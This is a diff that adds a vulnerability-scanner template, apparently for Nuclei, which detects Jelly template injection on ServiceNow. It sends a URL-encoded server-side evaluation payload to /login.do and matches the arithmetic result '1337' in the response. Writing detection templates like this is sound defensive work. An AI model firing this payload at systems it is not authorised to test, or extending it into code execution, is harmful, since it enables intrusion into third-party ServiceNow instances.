@@ -1,0 +1,27 @@
+id: Template-Injection-on-ServiceNow
+
+info:
+  name: Jelly Template Injection on ServiceNow
+  author: Brut Security
+  severity: Critical
+  description: |
+    This template detects Jelly Scripting Injection vulnerabilities by injecting a payload and checking for a specific multiplication result in the response.
+  reference:
+    - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
+
+http:
+  - raw:
+      - |
+        GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1337"
+        part: body
+      - type: status
+        status:
+          - 200
